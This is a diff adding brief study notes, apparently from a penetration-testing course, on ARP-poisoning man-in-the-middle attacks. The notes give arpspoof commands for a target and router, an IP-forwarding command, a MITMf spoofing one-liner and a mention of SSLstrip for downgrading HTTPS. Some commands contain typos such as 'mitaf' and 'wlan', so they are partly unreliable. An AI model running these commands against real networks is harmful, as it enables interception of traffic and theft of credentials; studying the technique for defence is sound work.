@@ -1,0 +1,29 @@
+//Man in the middle attacks
+//ARP Poisoning
+
+//The main issues with ARP are as followed
+1. Each ARP request/response is trusted
+2. Clients can accept responses even if they did not send a request
+
+
+//We will essential send an ARP response to the client telling it that we are the router
+
+
+//Actually running it we will use ARPSpoof
+
+arpspoof -i wlan0 -t (TARGETIP) (ROUTERIP)
+meanwile running
+arpspoof -i wlan -t (ROUTERIP) (TARGETIP)
+
+//Meanwhile we need to enable ip forwarding
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+
+//Another method that has more features
+
+mitaf --arp --spoof --gateway (ROUTERIP) --target (TARGETIP) -i (INTEFACE)
+
+//Bypassing HTTPS by using SSLstrip to turn it into http
+ Just the same as the previous commands because it automatically does it for us
